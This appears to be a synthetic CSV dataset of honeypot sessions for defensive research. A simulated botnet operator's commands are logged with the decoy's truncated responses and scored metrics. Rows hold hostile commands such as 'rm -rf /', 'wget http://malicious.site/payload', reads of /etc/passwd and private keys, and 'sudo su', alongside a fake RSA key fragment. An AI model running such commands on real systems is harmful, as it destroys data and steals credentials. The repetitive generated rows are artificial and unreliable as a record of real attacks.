session_id,attacker_id,attacker_profile,timestamp,attacker_input,honeypot_response,attack_type,risk_level,response_success,current_privileges,failed_attempts,session_position,attack_phase,engagement_time,hawkes_intensity,frustration_level,temporal_phase,deception_triggered,data_collected,privilege_escalation_attempt,high_risk_activity,system_state_hash,time_since_session_start,commands_per_minute
3,2,botnet_operator,2025-05-24 23:38:22.280956,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,72,initial_recon,0.1940154909821962,0.1000000000000356,2.498001805406602e-16,initial_recon,1,1,0,0,-8958916735605131775,73.21768647002337,20.622826118226087
3,2,botnet_operator,2025-05-24 23:38:22.474971,wget http://malicious.site/payload,Command executed,data_exfiltration,4,False,True,1,73,initial_recon,0.1477351535645919,0.1000000000000215,0.0,initial_recon,1,0,0,1,-8958916735605131775,73.36542162358796,20.622826118226087
3,2,botnet_operator,2025-05-24 23:38:22.622707,rm -rf /,Command executed,destruction,5,True,True,0,74,initial_recon,0.3086785563751577,0.1000000000000131,0.2,initial_recon,1,0,0,1,-8958916735605131775,73.67410017996312,20.622826118226087
3,2,botnet_operator,2025-05-24 23:38:22.931385,ls -la,"total 48
drwxr-xr-x 2 user user 4096 May 24 18:00 .
drwxr-xr-x 3 user user 4096 May 20 10:30 ..
-rw-...",reconnaissance,1,True,True,0,75,initial_recon,0.1,0.1000000000000079,0.1,initial_recon,1,0,0,0,-8958916735605131775,73.77410017996311,20.622826118226087
3,2,botnet_operator,2025-05-24 23:38:23.031385,cat private_key.pem,"-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA2K8Qn5mJ7vL9sF2nR8tY3kP6wE9xC4vB7mN1qS8dF5gH2jK
L9pM...",data_exfiltration,4,True,True,0,76,initial_recon,1.4477808015604852,0.1000000000000047,0.0,initial_recon,1,1,0,1,-8958916735605131775,75.2218809815236,20.622826118226087
3,2,botnet_operator,2025-05-24 23:38:24.479166,whoami,user,reconnaissance,1,False,True,1,77,initial_recon,0.1,0.1000000000000031,0.0,initial_recon,1,0,0,0,-8958916735605131775,75.3218809815236,20.622826118226087
3,2,botnet_operator,2025-05-24 23:38:24.579166,ls -la,"total 48
drwxr-xr-x 2 user user 4096 May 24 18:00 .
drwxr-xr-x 3 user user 4096 May 20 10:30 ..
-rw-...",reconnaissance,1,True,True,0,78,initial_recon,0.7567111497748626,0.1000000000000016,0.2,initial_recon,1,0,0,0,-8958916735605131775,76.07859213129846,20.622826118226087
3,2,botnet_operator,2025-05-24 23:38:25.335877,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,79,initial_recon,1.1440037325975656,0.1000000000000009,0.1,initial_recon,1,1,0,0,-8958916735605131775,77.22259586389603,20.622826118226087
3,2,botnet_operator,2025-05-24 23:38:26.479881,wget http://malicious.site/payload,Command executed,data_exfiltration,4,True,True,0,80,initial_recon,0.5614933337233191,0.1000000000000004,0.0,initial_recon,1,1,0,1,-8958916735605131775,77.78408919761935,20.622826118226087
3,2,botnet_operator,2025-05-24 23:38:27.041374,whoami,user,reconnaissance,1,True,True,0,81,initial_recon,0.1,0.1000000000000002,0.0,initial_recon,1,0,0,0,-8958916735605131775,77.88408919761935,20.622826118226087
3,2,botnet_operator,2025-05-24 23:38:27.141374,ls -la,"total 48
drwxr-xr-x 2 user user 4096 May 24 18:00 .
drwxr-xr-x 3 user user 4096 May 20 10:30 ..
-rw-...",reconnaissance,1,True,True,0,82,initial_recon,0.1,0.1000000000000001,0.0,initial_recon,1,0,0,0,-8958916735605131775,77.98408919761935,20.622826118226087
3,2,botnet_operator,2025-05-24 23:38:27.241374,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,83,initial_recon,0.6048963030291191,0.1,0.0,initial_recon,1,1,0,0,-8958916735605131775,78.58898550064846,20.622826118226087
3,2,botnet_operator,2025-05-24 23:38:27.846271,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,84,initial_recon,0.1,0.1,0.0,initial_recon,1,1,0,0,-8958916735605131775,78.68898550064847,20.622826118226087
3,2,botnet_operator,2025-05-24 23:38:27.946271,rm -rf /,Command executed,destruction,5,False,True,1,85,initial_recon,0.4304641940052002,0.1,0.0,initial_recon,1,0,0,1,-8958916735605131775,79.11944969465367,20.622826118226087
3,2,botnet_operator,2025-05-24 23:38:28.376735,rm -rf /,Command executed,destruction,5,True,True,0,86,initial_recon,1.0560099538099414,0.1,0.2,initial_recon,1,0,0,1,-8958916735605131775,80.17545964846362,20.622826118226087
3,2,botnet_operator,2025-05-24 23:38:29.432745,cat /etc/passwd,"root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/...",reconnaissance,2,True,True,0,87,initial_recon,0.1210996451745314,0.1,0.1,initial_recon,1,0,0,0,-8958916735605131775,80.29655929363814,20.622826118226087
3,2,botnet_operator,2025-05-24 23:38:29.553844,find / -name '*.key',Command not found,data_exfiltration,3,False,True,1,88,initial_recon,1.1907954024213374,0.1,0.0,initial_recon,1,0,0,0,-8958916735605131775,81.48735469605948,20.622826118226087
3,2,botnet_operator,2025-05-24 23:38:30.744640,ls -la,"total 48
drwxr-xr-x 2 user user 4096 May 24 18:00 .
drwxr-xr-x 3 user user 4096 May 20 10:30 ..
-rw-...",reconnaissance,1,True,True,0,89,initial_recon,0.2707060804778105,0.1,0.2,initial_recon,1,0,0,0,-8958916735605131775,81.75806077653729,20.622826118226087
3,2,botnet_operator,2025-05-24 23:38:31.015346,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,90,initial_recon,0.1013471015878572,0.1,0.1,initial_recon,1,1,0,0,-8958916735605131775,81.85940787812515,20.622826118226087
3,2,botnet_operator,2025-05-24 23:38:31.116693,whoami,user,reconnaissance,1,True,True,0,91,initial_recon,0.1,0.1,0.0,initial_recon,1,0,0,0,-8958916735605131775,81.95940787812515,20.622826118226087
3,2,botnet_operator,2025-05-24 23:38:31.216693,sudo su,Command executed,privilege_escalation,5,False,True,1,92,initial_recon,0.1,0.1,0.0,initial_recon,1,0,1,1,-8958916735605131775,82.05940787812514,20.622826118226087
3,2,botnet_operator,2025-05-24 23:38:31.316693,crontab -e,Command executed,persistence,3,True,True,0,93,initial_recon,0.1543507488335077,0.1,0.2,initial_recon,1,0,0,0,-8958916735605131775,82.21375862695865,20.622826118226087
3,2,botnet_operator,2025-05-24 23:38:31.471044,ls -la,"total 48
drwxr-xr-x 2 user user 4096 May 24 18:00 .
drwxr-xr-x 3 user user 4096 May 20 10:30 ..
-rw-...",reconnaissance,1,True,True,0,94,initial_recon,0.3513532957568054,0.1,0.1,initial_recon,1,0,0,0,-8958916735605131775,82.56511192271546,20.622826118226087
3,2,botnet_operator,2025-05-24 23:38:31.822397,cat private_key.pem,"-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA2K8Qn5mJ7vL9sF2nR8tY3kP6wE9xC4vB7mN1qS8dF5gH2jK
L9pM...",data_exfiltration,4,True,True,0,95,initial_recon,0.9907133922374812,0.1,0.0,initial_recon,1,1,0,1,-8958916735605131775,83.55582531495294,20.622826118226087
3,2,botnet_operator,2025-05-24 23:38:32.813110,find / -name '*.key',Command not found,data_exfiltration,3,False,True,1,96,initial_recon,1.06491250119862,0.1,0.0,initial_recon,1,0,0,0,-8958916735605131775,84.62073781615156,20.622826118226087
3,2,botnet_operator,2025-05-24 23:38:33.878023,sudo su,Command executed,privilege_escalation,5,True,True,0,97,initial_recon,0.1,0.1,0.2,initial_recon,1,0,1,1,-8958916735605131775,84.72073781615155,20.622826118226087
3,2,botnet_operator,2025-05-24 23:38:33.978023,cat private_key.pem,"-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA2K8Qn5mJ7vL9sF2nR8tY3kP6wE9xC4vB7mN1qS8dF5gH2jK
L9pM...",data_exfiltration,4,True,True,0,98,initial_recon,0.233156039315308,0.1,0.1,initial_recon,1,1,0,1,-8958916735605131775,84.95389385546687,20.622826118226087
3,2,botnet_operator,2025-05-24 23:38:34.211179,cat /etc/passwd,"root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/...",reconnaissance,2,True,True,0,99,initial_recon,0.3084613391992964,0.1,0.0,initial_recon,1,0,0,0,-8958916735605131775,85.26235519466617,20.622826118226087
3,2,botnet_operator,2025-05-24 23:38:34.519640,whoami,user,reconnaissance,1,False,True,1,100,initial_recon,0.1,0.1,0.0,initial_recon,1,0,0,0,-8958916735605131775,85.36235519466616,20.622826118226087
3,2,botnet_operator,2025-05-24 23:38:34.619640,cat /etc/passwd,"root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/...",reconnaissance,2,True,True,0,101,initial_recon,0.2759208306233397,0.1,0.2,initial_recon,1,0,0,0,-8958916735605131775,85.6382760252895,20.622826118226087
3,2,botnet_operator,2025-05-24 23:38:34.895561,ls,admin_backup.sql  private_key.pem  server_credentials.txt  passwords.txt  api_keys.txt  .bash_histor...,reconnaissance,1,True,True,0,102,initial_recon,0.1905198623044205,0.1,0.1,initial_recon,1,0,0,0,-8958916735605131775,85.82879588759393,20.622826118226087
3,2,botnet_operator,2025-05-24 23:38:35.086081,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,103,initial_recon,0.2620220549742364,0.1,0.0,initial_recon,1,1,0,0,-8958916735605131775,86.09081794256817,20.622826118226087
3,2,botnet_operator,2025-05-24 23:38:35.348103,sudo su,Command executed,privilege_escalation,5,False,True,1,104,initial_recon,0.6964591651777907,0.1,0.0,initial_recon,1,0,1,1,-8958916735605131775,86.78727710774595,20.622826118226087
3,2,botnet_operator,2025-05-24 23:38:36.044562,cat private_key.pem,"-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA2K8Qn5mJ7vL9sF2nR8tY3kP6wE9xC4vB7mN1qS8dF5gH2jK
L9pM...",data_exfiltration,4,True,True,0,105,initial_recon,0.5666269489614255,0.1,0.2,initial_recon,1,1,0,1,-8958916735605131775,87.35390405670738,20.622826118226087
3,2,botnet_operator,2025-05-24 23:38:36.611189,sudo su,Command executed,privilege_escalation,5,True,True,0,106,initial_recon,0.1242592582404283,0.1,0.1,initial_recon,1,0,1,1,-8958916735605131775,87.4781633149478,20.622826118226087
3,2,botnet_operator,2025-05-24 23:38:36.735448,crontab -e,Command executed,persistence,3,False,True,1,107,initial_recon,0.7983250668763663,0.1,0.0,initial_recon,1,0,0,0,-8958916735605131775,88.27648838182418,20.622826118226087
3,2,botnet_operator,2025-05-24 23:38:37.533773,wget http://malicious.site/payload,Command executed,data_exfiltration,4,False,True,2,108,initial_recon,1.140603431124964,0.1,0.2,initial_recon,1,0,0,1,-8958916735605131775,89.41709181294914,20.622826118226087
3,2,botnet_operator,2025-05-24 23:38:38.674377,crontab -e,Command executed,persistence,3,False,True,3,109,initial_recon,0.6161226604546555,0.1,0.4,initial_recon,1,0,0,0,-8958916735605131775,90.03321447340379,20.622826118226087
3,2,botnet_operator,2025-05-24 23:38:39.290499,crontab -e,Command executed,persistence,3,False,True,4,110,initial_recon,2.649563557297949,0.1,0.6000000000000001,initial_recon,1,0,0,0,-8958916735605131775,92.68277803070174,20.622826118226087
3,2,botnet_operator,2025-05-24 23:38:41.940063,wget http://malicious.site/payload,Command executed,data_exfiltration,4,True,True,3,111,initial_recon,1.2527982560827082,0.1,0.8,initial_recon,1,1,0,1,-8958916735605131775,93.93557628678444,20.622826118226087
3,2,botnet_operator,2025-05-24 23:38:43.192861,rm -rf /,Command executed,destruction,5,False,True,4,112,initial_recon,0.4732360386689333,0.1,0.7000000000000001,initial_recon,1,0,0,1,-8958916735605131775,94.40881232545338,20.622826118226087
3,2,botnet_operator,2025-05-24 23:38:43.666097,crontab -e,Command executed,persistence,3,True,True,3,113,initial_recon,1.170978806477011,0.1,0.9000000000000001,initial_recon,1,0,0,0,-8958916735605131775,95.5797911319304,20.622826118226087
3,2,botnet_operator,2025-05-24 23:38:44.837076,find / -name '*.key',Command not found,data_exfiltration,3,False,True,4,114,initial_recon,4.263820247910137,0.1,0.8000000000000002,initial_recon,1,0,0,0,-8958916735605131775,99.84361137984052,20.622826118226087
3,2,botnet_operator,2025-05-24 23:38:49.100896,crontab -e,Command executed,persistence,3,False,True,5,115,initial_recon,0.3733166985070439,0.1,1.0000000000000002,initial_recon,1,0,0,0,-8958916735605131775,100.21692807834758,20.622826118226087
3,2,botnet_operator,2025-05-24 23:38:49.474213,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,4,116,initial_recon,14.687200282453368,0.1,1.2000000000000002,initial_recon,1,1,0,0,-8958916735605131775,114.90412836080094,20.622826118226087
3,2,botnet_operator,2025-05-24 23:39:04.161413,wget http://malicious.site/payload,Command executed,data_exfiltration,4,False,True,5,117,initial_recon,3.497457660413187,0.1,1.1,initial_recon,1,0,0,1,-8958916735605131775,118.40158602121411,20.622826118226087
3,2,botnet_operator,2025-05-24 23:39:07.658871,sudo su,Command executed,privilege_escalation,5,True,True,4,118,initial_recon,1.0466434595055196,0.1,1.3,initial_recon,1,0,1,1,-8958916735605131775,119.44822948071965,20.622826118226087
3,2,botnet_operator,2025-05-24 23:39:08.705514,find / -name '*.key',Command not found,data_exfiltration,3,False,True,5,119,initial_recon,12.647122619033484,0.1,1.2,initial_recon,1,0,0,0,-8958916735605131775,132.09535209975314,20.622826118226087
3,2,botnet_operator,2025-05-24 23:39:21.352637,cat private_key.pem,"-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA2K8Qn5mJ7vL9sF2nR8tY3kP6wE9xC4vB7mN1qS8dF5gH2jK
L9pM...",data_exfiltration,4,True,True,4,120,initial_recon,11.793057946060426,0.1,1.4,initial_recon,1,1,0,1,-8958916735605131775,143.88841004581357,20.622826118226087
3,2,botnet_operator,2025-05-24 23:39:33.145695,ls -la,"total 48
drwxr-xr-x 2 user user 4096 May 24 18:00 .
drwxr-xr-x 3 user user 4096 May 20 10:30 ..
-rw-...",reconnaissance,1,True,True,3,121,initial_recon,4.984025574170282,0.1,1.2999999999999998,initial_recon,1,0,0,0,-8958916735605131775,148.87243561998383,20.622826118226087
3,2,botnet_operator,2025-05-24 23:39:38.129721,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,2,122,initial_recon,4.57694854900802,0.1,1.1999999999999995,initial_recon,1,1,0,0,-8958916735605131775,153.44938416899186,20.622826118226087
3,2,botnet_operator,2025-05-24 23:39:42.706669,ls,admin_backup.sql  private_key.pem  server_credentials.txt  passwords.txt  api_keys.txt  .bash_histor...,reconnaissance,1,True,True,1,123,initial_recon,1.4880163068969878,0.1,1.0999999999999996,initial_recon,1,0,0,0,-8958916735605131775,154.93740047588886,20.622826118226087
3,2,botnet_operator,2025-05-24 23:39:44.194685,cat private_key.pem,"-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA2K8Qn5mJ7vL9sF2nR8tY3kP6wE9xC4vB7mN1qS8dF5gH2jK
L9pM...",data_exfiltration,4,True,True,0,124,initial_recon,6.179749154269714,0.1,0.9999999999999996,initial_recon,1,1,0,1,-8958916735605131775,161.11714963015856,20.622826118226087
3,2,botnet_operator,2025-05-24 23:39:50.374435,rm -rf /,Command executed,destruction,5,False,True,1,125,initial_recon,4.43320430669367,0.1,0.8999999999999997,initial_recon,1,0,0,1,-8958916735605131775,165.55035393685225,20.622826118226087
3,2,botnet_operator,2025-05-24 23:39:54.807639,ls -la,"total 48
drwxr-xr-x 2 user user 4096 May 24 18:00 .
drwxr-xr-x 3 user user 4096 May 20 10:30 ..
-rw-...",reconnaissance,1,True,True,0,126,initial_recon,0.309335850517945,0.1,1.0999999999999996,initial_recon,1,0,0,0,-8958916735605131775,165.85968978737017,20.622826118226087
3,2,botnet_operator,2025-05-24 23:39:55.116975,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,127,initial_recon,2.168457332851932,0.1,0.9999999999999996,initial_recon,1,1,0,0,-8958916735605131775,168.02814712022212,20.622826118226087
3,2,botnet_operator,2025-05-24 23:39:57.285432,crontab -e,Command executed,persistence,3,False,True,1,128,initial_recon,2.169013329413822,0.1,0.8999999999999997,initial_recon,1,0,0,0,-8958916735605131775,170.19716044963593,20.622826118226087
3,2,botnet_operator,2025-05-24 23:39:59.454445,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,129,initial_recon,4.173569412025904,0.1,1.0999999999999996,initial_recon,1,1,0,0,-8958916735605131775,174.37072986166183,20.622826118226087
3,2,botnet_operator,2025-05-24 23:40:03.628015,whoami,user,reconnaissance,1,True,True,0,130,initial_recon,4.7621707094591965,0.1,0.9999999999999996,initial_recon,1,0,0,0,-8958916735605131775,179.13290057112104,20.622826118226087
3,2,botnet_operator,2025-05-24 23:40:08.390186,find / -name '*.key',Command not found,data_exfiltration,3,False,True,1,131,initial_recon,0.4815757830895984,0.1,0.8999999999999997,initial_recon,1,0,0,0,-8958916735605131775,179.61447635421064,20.622826118226087
3,2,botnet_operator,2025-05-24 23:40:08.871761,wget http://malicious.site/payload,Command executed,data_exfiltration,4,False,True,2,132,initial_recon,1.6909903572772265,0.1,1.0999999999999996,initial_recon,1,0,0,1,-8958916735605131775,181.30546671148787,20.622826118226087
3,2,botnet_operator,2025-05-24 23:40:10.562752,rm -rf /,Command executed,destruction,5,True,True,1,133,initial_recon,2.241024399402235,0.1,1.2999999999999996,initial_recon,1,0,0,1,-8958916735605131775,183.5464911108901,20.622826118226087
3,2,botnet_operator,2025-05-24 23:40:12.803776,rm -rf /,Command executed,destruction,5,False,True,2,134,initial_recon,3.772085492367079,0.1,1.1999999999999995,initial_recon,1,0,0,1,-8958916735605131775,187.3185766032572,20.622826118226087
3,2,botnet_operator,2025-05-24 23:40:16.575862,whoami,user,reconnaissance,1,False,True,3,135,initial_recon,17.38106632615746,0.1,1.3999999999999997,initial_recon,1,0,0,0,-8958916735605131775,204.69964292941464,20.622826118226087
3,2,botnet_operator,2025-05-24 23:40:33.956928,whoami,user,reconnaissance,1,True,True,2,136,initial_recon,1.3889830503335616,0.1,1.5999999999999994,initial_recon,1,0,0,0,-8958916735605131775,206.0886259797482,20.622826118226087
3,2,botnet_operator,2025-05-24 23:40:35.345911,cat /etc/passwd,"root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/...",reconnaissance,2,True,True,1,137,initial_recon,4.753272336724884,0.1,1.4999999999999991,initial_recon,1,0,0,0,-8958916735605131775,210.84189831647308,20.622826118226087
3,2,botnet_operator,2025-05-24 23:40:40.099183,cat private_key.pem,"-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA2K8Qn5mJ7vL9sF2nR8tY3kP6wE9xC4vB7mN1qS8dF5gH2jK
L9pM...",data_exfiltration,4,True,True,0,138,initial_recon,3.6908721111652127,0.1,1.3999999999999992,initial_recon,1,1,0,1,-8958916735605131775,214.5327704276383,20.622826118226087
3,2,botnet_operator,2025-05-24 23:40:43.790055,rm -rf /,Command executed,destruction,5,True,True,0,139,initial_recon,7.956815904098814,0.1,1.2999999999999992,initial_recon,1,0,0,1,-8958916735605131775,222.48958633173712,20.622826118226087
3,2,botnet_operator,2025-05-24 23:40:51.746871,crontab -e,Command executed,persistence,3,False,True,1,140,initial_recon,7.443403420877533,0.1,1.199999999999999,initial_recon,1,0,0,0,-8958916735605131775,229.93298975261465,20.622826118226087
3,2,botnet_operator,2025-05-24 23:40:59.190275,find / -name '*.key',Command not found,data_exfiltration,3,False,True,2,141,initial_recon,1.5750034913194098,0.1,1.399999999999999,initial_recon,1,0,0,0,-8958916735605131775,231.50799324393404,20.622826118226087
3,2,botnet_operator,2025-05-24 23:41:00.765278,ls,admin_backup.sql  private_key.pem  server_credentials.txt  passwords.txt  api_keys.txt  .bash_histor...,reconnaissance,1,True,True,1,142,initial_recon,4.855915239449169,0.1,1.599999999999999,initial_recon,1,0,0,0,-8958916735605131775,236.36390848338323,20.622826118226087
3,2,botnet_operator,2025-05-24 23:41:05.621193,cat private_key.pem,"-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA2K8Qn5mJ7vL9sF2nR8tY3kP6wE9xC4vB7mN1qS8dF5gH2jK
L9pM...",data_exfiltration,4,True,True,0,143,initial_recon,0.889935418917933,0.1,1.499999999999999,initial_recon,1,1,0,1,-8958916735605131775,237.2538439023012,20.622826118226087
3,2,botnet_operator,2025-05-24 23:41:06.511129,ls -la,"total 48
drwxr-xr-x 2 user user 4096 May 24 18:00 .
drwxr-xr-x 3 user user 4096 May 20 10:30 ..
-rw-...",reconnaissance,1,True,True,0,144,initial_recon,2.5482706340727512,0.1,1.3999999999999988,initial_recon,1,0,0,0,-8958916735605131775,239.8021145363739,20.622826118226087
3,2,botnet_operator,2025-05-24 23:41:09.059400,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,145,initial_recon,0.5294063034582248,0.1,1.2999999999999987,initial_recon,1,1,0,0,-8958916735605131775,240.3315208398321,20.622826118226087
3,2,botnet_operator,2025-05-24 23:41:09.588806,sudo su,Command executed,privilege_escalation,5,False,True,1,146,initial_recon,5.875639362760039,0.1,1.1999999999999986,initial_recon,1,0,1,1,-8958916735605131775,246.20716020259215,20.622826118226087
3,2,botnet_operator,2025-05-24 23:41:15.464445,cat private_key.pem,"-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA2K8Qn5mJ7vL9sF2nR8tY3kP6wE9xC4vB7mN1qS8dF5gH2jK
L9pM...",data_exfiltration,4,True,True,0,147,initial_recon,0.352778816011566,0.1,1.3999999999999986,initial_recon,1,1,0,1,-8958916735605131775,246.55993901860373,20.622826118226087
3,2,botnet_operator,2025-05-24 23:41:15.817224,ls -la,"total 48
drwxr-xr-x 2 user user 4096 May 24 18:00 .
drwxr-xr-x 3 user user 4096 May 20 10:30 ..
-rw-...",reconnaissance,1,True,True,0,148,initial_recon,2.629597309775761,0.1,1.2999999999999985,initial_recon,1,0,0,0,-8958916735605131775,249.1895363283795,20.622826118226087
3,2,botnet_operator,2025-05-24 23:41:18.446821,cat private_key.pem,"-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA2K8Qn5mJ7vL9sF2nR8tY3kP6wE9xC4vB7mN1qS8dF5gH2jK
L9pM...",data_exfiltration,4,True,True,0,149,initial_recon,4.447000169338293,0.1,1.1999999999999984,initial_recon,1,1,0,1,-8958916735605131775,253.6365364977178,20.622826118226087
3,2,botnet_operator,2025-05-24 23:41:22.893821,rm -rf /,Command executed,destruction,5,False,True,1,150,initial_recon,0.4360926818519344,0.1,1.0999999999999983,initial_recon,1,0,0,1,-8958916735605131775,254.07262917956973,20.622826118226087
3,2,botnet_operator,2025-05-24 23:41:23.329914,sudo su,Permission denied,privilege_escalation,5,False,True,2,151,initial_recon,1.125153423184218,0.1,1.2999999999999985,initial_recon,1,0,1,1,-8958916735605131775,255.19778260275396,20.622826118226087
3,2,botnet_operator,2025-05-24 23:41:24.455068,sudo su,Command executed,privilege_escalation,5,False,True,3,152,initial_recon,3.585213937535157,0.1,1.6999999999999982,initial_recon,1,0,1,1,-8958916735605131775,258.7829965402891,20.622826118226087
3,2,botnet_operator,2025-05-24 23:41:28.040282,wget http://malicious.site/payload,Command executed,data_exfiltration,4,False,True,4,153,initial_recon,5.402373805931869,0.1,1.899999999999998,initial_recon,1,0,0,1,-8958916735605131775,264.18537034622096,20.622826118226087
3,2,botnet_operator,2025-05-24 23:41:33.442655,ls,admin_backup.sql  private_key.pem  server_credentials.txt  passwords.txt  api_keys.txt  .bash_histor...,reconnaissance,1,True,True,3,154,initial_recon,4.633563473107687,0.1,2.0999999999999983,initial_recon,1,0,0,0,-8958916735605131775,268.81893381932866,20.622826118226087
3,2,botnet_operator,2025-05-24 23:41:38.076219,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,2,155,initial_recon,0.3753002306666172,0.1,1.9999999999999984,initial_recon,1,1,0,0,-8958916735605131775,269.19423404999526,20.622826118226087
3,2,botnet_operator,2025-05-24 23:41:38.451519,ls -la,"total 48
drwxr-xr-x 2 user user 4096 May 24 18:00 .
drwxr-xr-x 3 user user 4096 May 20 10:30 ..
-rw-...",reconnaissance,1,True,True,1,156,initial_recon,0.8925282203362642,0.1,1.899999999999998,initial_recon,1,0,0,0,-8958916735605131775,270.0867622703315,20.622826118226087
3,2,botnet_operator,2025-05-24 23:41:39.344047,cat private_key.pem,"-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA2K8Qn5mJ7vL9sF2nR8tY3kP6wE9xC4vB7mN1qS8dF5gH2jK
L9pM...",data_exfiltration,4,True,True,0,157,initial_recon,9.291558164777308,0.1,1.799999999999998,initial_recon,1,1,0,1,-8958916735605131775,279.37832043510883,20.622826118226087
3,2,botnet_operator,2025-05-24 23:41:48.635605,cat /etc/passwd,"root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/...",reconnaissance,2,True,True,0,158,initial_recon,0.6072812405863037,0.1,1.699999999999998,initial_recon,1,0,0,0,-8958916735605131775,279.98560167569514,20.622826118226087
3,2,botnet_operator,2025-05-24 23:41:49.242887,wget http://malicious.site/payload,Command executed,data_exfiltration,4,False,True,1,159,initial_recon,0.8895365480399138,0.1,1.599999999999998,initial_recon,1,0,0,1,-8958916735605131775,280.87513822373506,20.622826118226087
3,2,botnet_operator,2025-05-24 23:41:50.132423,rm -rf /,Command executed,destruction,5,True,True,0,160,initial_recon,4.219168892852156,0.1,1.7999999999999978,initial_recon,1,0,0,1,-8958916735605131775,285.09430711658723,20.622826118226087
3,2,botnet_operator,2025-05-24 23:41:54.351592,find / -name '*.key',Command not found,data_exfiltration,3,False,True,1,161,initial_recon,8.433247664102087,0.1,1.6999999999999975,initial_recon,1,0,0,0,-8958916735605131775,293.5275547806893,20.622826118226087
3,2,botnet_operator,2025-05-24 23:42:02.784840,crontab -e,Command executed,persistence,3,False,True,2,162,initial_recon,9.820132419856368,0.1,1.8999999999999977,initial_recon,1,0,0,0,-8958916735605131775,303.3476872005457,20.622826118226087
